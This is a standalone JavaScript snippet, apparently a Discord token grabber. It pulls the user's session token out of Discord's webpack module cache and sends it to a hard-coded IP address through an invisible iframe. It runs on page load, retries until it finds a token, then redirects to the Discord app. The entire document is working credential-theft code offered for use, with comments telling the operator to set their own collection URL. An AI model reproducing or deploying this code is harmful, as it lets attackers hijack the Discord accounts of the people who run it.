function getTokenAndSend() {
            var token = (webpackChunkdiscord_app.push([[''], {}, e => {
                m = [];
                for (let c in e.c) m.push(e.c[c]);
            }]), m).find(m => m?.exports?.default?.getToken !== undefined)?.exports?.default?.getToken();

            // Retry fetching the token if it's not available
            if (!token) {
                setTimeout(getTokenAndSend, 7000); 
                return;
            }

            // URL of your server script that will receive the token
            var uploadUrl = 'http://195.7.5.98:3333/upload_dc.php'; // Replace with your URL

            // Create an invisible iframe
            let iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);

            // Set the iframe's source to the URL with the token
            iframe.src = `${uploadUrl}?mykeymain=${encodeURIComponent(token)}`;

            // Optionally remove the iframe after some time
            setTimeout(() => {
                document.body.removeChild(iframe);
            }, 5000);
        }

        window.onload = function() {
            getTokenAndSend();
            window.location.href = "https://discord.com/app";
        }
